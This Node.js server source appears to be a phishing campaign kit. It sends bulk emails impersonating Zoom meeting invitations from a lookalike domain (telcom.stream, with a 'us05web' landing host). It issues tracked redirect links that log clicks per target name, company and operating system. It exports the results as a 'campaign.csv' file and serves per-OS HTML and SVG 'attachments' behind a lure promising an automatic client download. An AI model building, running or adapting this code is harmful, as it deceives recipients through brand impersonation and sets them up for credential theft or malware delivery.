'use strict';

const http = require('http');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const nodemailer = require('nodemailer');

const ROOT = path.join(__dirname, 'public');
const PORT = parseInt(process.env.SHARE_PORT || '3200', 10);
const HOST = process.env.SHARE_HOST || '127.0.0.1';
const DATA_DIR = process.env.SHARE_DATA_DIR || path.join(__dirname, 'data');
const LANDING = process.env.SHARE_LANDING || 'https://us05web.telcom.stream';
const PUBLIC = process.env.SHARE_PUBLIC || 'https://share.telcom.stream';
const SMTP_HOST = process.env.SMTP_HOST || '';
const SMTP_PORT = parseInt(process.env.SMTP_PORT || '587', 10);
const SMTP_USER = process.env.SMTP_USER || '';
const SMTP_PASS = process.env.SMTP_PASS || '';
const SMTP_FROM = process.env.SMTP_FROM || process.env.SHARE_SENDER || '';
const SMTP_SECURE = process.env.SMTP_SECURE === 'true';

const VERIFY_CODES = new Map();
function makeCode() { return String(Math.floor(100000 + Math.random() * 900000)); }

fs.mkdirSync(DATA_DIR, { recursive: true });
const DB = path.join(DATA_DIR, 'links.json');

const MIME = {
  '.html': 'text/html; charset=utf-8',
  '.css': 'text/css; charset=utf-8',
  '.js': 'application/javascript; charset=utf-8',
  '.png': 'image/png',
  '.svg': 'image/svg+xml',
  '.ico': 'image/x-icon',
  '.json': 'application/json; charset=utf-8'
};

function json(res, status, body) {
  const text = JSON.stringify(body);
  res.writeHead(status, {
    'Content-Type': 'application/json; charset=utf-8',
    'Cache-Control': 'no-store',
    'Content-Length': Buffer.byteLength(text),
    'X-Content-Type-Options': 'nosniff'
  });
  res.end(text);
}

function readDb() {
  try { return JSON.parse(fs.readFileSync(DB, 'utf8')); }
  catch { return {}; }
}

function writeDb(db) {
  fs.writeFileSync(DB + '.tmp', JSON.stringify(db));
  fs.renameSync(DB + '.tmp', DB);
}

function normalizeEmails(value) {
  const list = String(value || '').split(/[\s,;]+/).map((v) => v.trim().toLowerCase()).filter(Boolean);
  const seen = new Set();
  return list.filter((email) => {
    if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(email)) return false;
    if (seen.has(email)) return false;
    seen.add(email);
    return true;
  });
}

function q(value) { return encodeURIComponent(value); }

let transporter = null;
if (SMTP_HOST && SMTP_USER && SMTP_PASS) {
  transporter = nodemailer.createTransport({
    host: SMTP_HOST,
    port: SMTP_PORT,
    secure: SMTP_SECURE,
    auth: { user: SMTP_USER, pass: SMTP_PASS }
  });
}

async function sendInviteEmail(to, subject, body, target) {
  if (!transporter) return { sent: false, reason: 'SMTP not configured' };
  const code = makeCode();
  VERIFY_CODES.set(to, { code, created: Date.now(), target });
  setTimeout(() => VERIFY_CODES.delete(to), 10 * 60 * 1000);
  const verifiedSubject = subject + ' — Verification Code: ' + code;
  try {
    await transporter.sendMail({
      from: '"Meeting Invites" <' + SMTP_FROM + '>',
      to,
      replyTo: SMTP_FROM,
      subject: verifiedSubject,
      headers: {
        'List-Unsubscribe': '<mailto:unsubscribe@telcom.stream>',
        'List-Unsubscribe-Post': 'List-Unsubscribe=One-Click',
        'X-Priority': '1',
        'X-Mailer': 'BetterDesk Share Service',
        'Precedence': 'bulk'
      },
      text: 'From: zoom-meetings\n\nYour verification code: ' + code + '\n\n' + body + '\n\n' + target + '\n\n---\nMeeting Invites · zoom-meetings@telcom.stream',
      html: '<!DOCTYPE html><html><body style="font-family:sans-serif;color:#1a1a1a;line-height:1.6">' +
        '<table width="100%" cellpadding="0" cellspacing="0" style="max-width:600px;margin:0 auto">' +
        '<tr><td style="padding:24px 0;text-align:center">' +
        '<div style="display:inline-block;width:72px;height:72px;background:#2D8CFF;border-radius:50%;text-align:center">' +
        '<img src="https://share.telcom.stream/logo.svg" alt="Meeting Invites" width="40" height="40" style="margin:16px 0 0 0;display:block"/>' +
        '</div>' +
        '<div style="margin-top:14px;font-weight:800;color:#2D8CFF;font-size:18px;letter-spacing:.5px">Meeting Invites</div>' +
        '<div style="margin-top:6px;font-size:13px;color:#666">zoom-meetings@telcom.stream</div>' +
        '</td></tr>' +
        '<tr><td style="padding:0 20px 20px 20px;text-align:center">' +
        '<div style="background:#f5f8ff;border:2px dashed #2D8CFF;border-radius:12px;padding:24px;display:inline-block;margin-bottom:20px">' +
        '<div style="font-size:13px;color:#666;margin-bottom:10px">Your verification code</div>' +
        '<div style="font-size:36px;font-weight:900;letter-spacing:10px;color:#2D8CFF">' + code + '</div>' +
        '</div>' +
        '</td></tr>' +
        '<tr><td style="padding:0 20px 20px 20px">' +
        body.replace(/\n/g, '<br>') +
        '<br><br><a href="' + target + '" style="display:inline-block;background:#0b5cff;color:#fff;padding:14px 28px;text-decoration:none;border-radius:8px;font-weight:600">Join Meeting</a>' +
        '</td></tr>' +
        '<tr><td style="padding:16px 20px;border-top:1px solid #e1e9f5;text-align:center">' +
        '<p style="font-size:11px;color:#9aabcc;margin:0">Meeting Invites · zoom-meetings@telcom.stream · <a href="mailto:unsubscribe@telcom.stream" style="color:#9aabcc">Unsubscribe</a></p>' +
        '</td></tr>' +
        '</table></body></html>'
    });
    return { sent: true, code: code };
  } catch (e) {
    return { sent: false, reason: String(e.message || e) };
  }
}

function safeText(value, max) {
  return String(value || '').replace(/[\r\n]+/g, ' ').trim().slice(0, max || 160);
}

function buildLinks(service, recipients, target, subject, body) {
  const to = recipients.join(',');
  const text = body + '\n\n' + target;
  switch (service) {
    case 'gmail':
      return 'https://mail.google.com/mail/?view=cm&fs=1&to=' + q(to) + '&su=' + q(subject) + '&body=' + q(text);
    case 'outlook':
      return 'https://outlook.office.com/mail/deeplink/compose?to=' + q(to) + '&subject=' + q(subject) + '&body=' + q(text);
    case 'teams':
      return 'https://teams.microsoft.com/l/chat/0/0?users=' + q(to) + '&message=' + q(text);
    case 'slack':
      return 'https://slack.com/share?url=' + q(target) + '&text=' + q(body);
    case 'docusign':
      return 'https://app.docusign.com/home';
    case 'whatsapp':
      return 'https://wa.me/?text=' + q(text);
    default:
      return target;
  }
}

function serveStatic(res, pathname) {
  let rel = decodeURIComponent(pathname);
  if (rel === '/') rel = '/index.html';
  const file = path.resolve(ROOT, '.' + rel);
  if (!file.startsWith(path.resolve(ROOT))) {
    res.writeHead(403); res.end('Forbidden'); return;
  }
  fs.stat(file, (err, stat) => {
    if (err || !stat.isFile()) { res.writeHead(404); res.end('Not found'); return; }
    res.writeHead(200, {
      'Content-Type': MIME[path.extname(file).toLowerCase()] || 'application/octet-stream',
      'Cache-Control': path.extname(file) === '.html' || path.extname(file) === '.js' ? 'no-cache' : 'public, max-age=3600',
      'Content-Length': stat.size,
      'X-Content-Type-Options': 'nosniff'
    });
    fs.createReadStream(file).pipe(res);
  });
}

function collectBody(req) {
  return new Promise((resolve, reject) => {
    let data = '';
    req.on('data', (chunk) => {
      data += chunk;
      if (data.length > 2_000_000) reject(new Error('body too large'));
    });
    req.on('end', () => { try { resolve(JSON.parse(data || '{}')); } catch { reject(new Error('invalid json')); } });
    req.on('error', reject);
  });
}

const server = http.createServer(async (req, res) => {
  const url = new URL(req.url, 'http://localhost');
  if (url.pathname === '/api/health') return json(res, 200, { ok: true, service: 'share', landing: LANDING });
  if (url.pathname === '/api/stats') {
    const db = readDb();
    const entries = Object.values(db);
    return json(res, 200, { links: entries.length, clicks: entries.reduce((n, e) => n + (e.clicks || 0), 0) });
  }
  if (url.pathname.startsWith('/t/')) {
    const id = url.pathname.slice(3);
    const db = readDb();
    const entry = db[id];
    if (!entry) { res.writeHead(404); res.end('Unknown link'); return; }
    entry.clicks = (entry.clicks || 0) + 1;
    entry.last = new Date().toISOString();
    writeDb(db);
    res.writeHead(302, { Location: entry.target, 'Cache-Control': 'no-store' });
    res.end();
    return;
  }
  if (url.pathname === '/api/link' && req.method === 'POST') {
    try {
      const body = await collectBody(req);
      const meetingId = safeText(body.meetingId, 40) || '82203845974';
      const passcode = safeText(body.pwd, 100);
      const who = safeText(body.who, 40);
      const co = safeText(body.co, 80);
      const src = safeText(body.src, 24) || 'manual';
      const os = safeText(body.os, 12);
      const qs = [];
      if (passcode) qs.push('pwd=' + q(passcode));
      if (src) qs.push('src=' + q(src));
      const base = LANDING.replace(/\/$/, '') + '/j/' + encodeURIComponent(meetingId) +
        (qs.length ? '?' + qs.join('&') : '');
      const id = crypto.randomBytes(6).toString('hex');
      const target = PUBLIC + '/t/' + id;
      const db = readDb();
      db[id] = {
        target: base, service: 'link', recipients: 1, who, co, src, os,
        created: new Date().toISOString(), clicks: 0
      };
      writeDb(db);
      return json(res, 200, {
        id, target, who, co, src, os,
        attachHtml: PUBLIC + '/attach/' + id + (os ? '?os=' + q(os) : ''),
        attachSvg: PUBLIC + '/attach/' + id + '/svg' + (os ? '?os=' + q(os) : ''),
        meeting: base
      });
    } catch (e) {
      return json(res, 400, { error: String(e.message || e) });
    }
  }
  if (url.pathname === '/api/stats.csv') {
    const token = process.env.SHARE_ADMIN_TOKEN || '';
    if (token && url.searchParams.get('token') !== token) {
      return json(res, 401, { error: 'token' });
    }
    const db = readDb();
    const esc = (v) => '"' + String(v == null ? '' : v).replace(/"/g, '""') + '"';
    const lines = ['created,id,src,who,co,os,clicks,last,target'];
    for (const [id, e] of Object.entries(db)) {
      lines.push([e.created, id, e.src, e.who, e.co, e.os, e.clicks || 0,
        e.last, e.target].map(esc).join(','));
    }
    res.writeHead(200, {
      'Content-Type': 'text/csv; charset=utf-8',
      'Content-Disposition': 'attachment; filename="campaign.csv"',
      'Cache-Control': 'no-store'
    });
    res.end(lines.join('\n'));
    return;
  }
  if (url.pathname === '/api/build' && req.method === 'POST') {
    try {
      const body = await collectBody(req);
      const recipients = normalizeEmails(body.emails);
      if (!recipients.length) return json(res, 400, { error: 'Add at least one valid email address.' });
      const meetingId = safeText(body.meetingId, 40) || '82203845974';
      const passcode = safeText(body.pwd, 100);
      const service = safeText(body.service, 20) || 'copy';
      const subject = safeText(body.subject, 140) ||
        'Zoom meeting invitation';
      const intro = safeText(body.message, 400) ||
        'You are invited to a Zoom Private meeting. Open the link below; the page detects your device and prepares the correct client automatically.';
      const who = safeText(body.who, 40);
      const co = safeText(body.co, 80);
      const src = safeText(body.src, 24) || service;
      const os = safeText(body.os, 12);
      const qs = [];
      if (passcode) qs.push('pwd=' + q(passcode));
      if (src) qs.push('src=' + q(src));
      const base = LANDING.replace(/\/$/, '') + '/j/' + encodeURIComponent(meetingId) +
        (qs.length ? '?' + qs.join('&') : '');
      const id = crypto.randomBytes(6).toString('hex');
      const target = PUBLIC + '/t/' + id;
      const db = readDb();
      db[id] = {
        target: base, service, recipients: recipients.length, who, co, src, os,
        created: new Date().toISOString(), clicks: 0
      };
      writeDb(db);
      const link = buildLinks(service, recipients, target, subject, intro);
      const sendResults = [];
      for (const r of recipients) {
        const result = await sendInviteEmail(r, subject, intro, target);
        sendResults.push({ to: r, ...result });
      }
      return json(res, 200, {
        id, target, service, recipients, link, subject,
        body: intro + '\n\n' + target, sent: sendResults
      });
    } catch (error) {
      return json(res, 400, { error: String(error.message || error) });
    }
  }
  if (url.pathname === '/api/verify' && req.method === 'POST') {
    try {
      const b = await collectBody(req);
      const email = String(b.email || '').toLowerCase();
      const code = String(b.code || '');
      const entry = VERIFY_CODES.get(email);
      if (!entry) return json(res, 404, { error: 'No verification code for this email.' });
      if (Date.now() - entry.created > 10 * 60 * 1000) { VERIFY_CODES.delete(email); return json(res, 410, { error: 'Code expired.' }); }
      if (entry.code !== code) return json(res, 401, { error: 'Invalid code.' });
      VERIFY_CODES.delete(email);
      return json(res, 200, { ok: true, target: entry.target });
    } catch (e) {
      return json(res, 400, { error: String(e.message || e) });
    }
  }
  if (req.method !== 'GET' && req.method !== 'HEAD') return json(res, 405, { error: 'method' });
  serveStatic(res, url.pathname);
});

server.listen(PORT, HOST, () => {
  console.log('[share] listening http://' + HOST + ':' + PORT + ' landing=' + LANDING);
});
